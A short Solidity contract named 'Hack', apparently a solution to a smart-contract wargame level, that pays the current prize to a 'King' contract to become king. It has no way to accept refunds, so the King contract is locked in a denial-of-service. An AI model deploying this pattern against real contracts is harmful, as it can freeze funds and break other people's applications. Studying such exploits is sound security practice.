// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

interface IKing {
    function prize() external view returns (uint256);
    function _king() external view returns (address);
}

contract Hack {
    constructor(address payable kingContractAddress) payable {
        uint256 prize = IKing(kingContractAddress).prize();
        (bool success,) = kingContractAddress.call{value: prize}("");
        require(success, "Transaction failed");
    }
}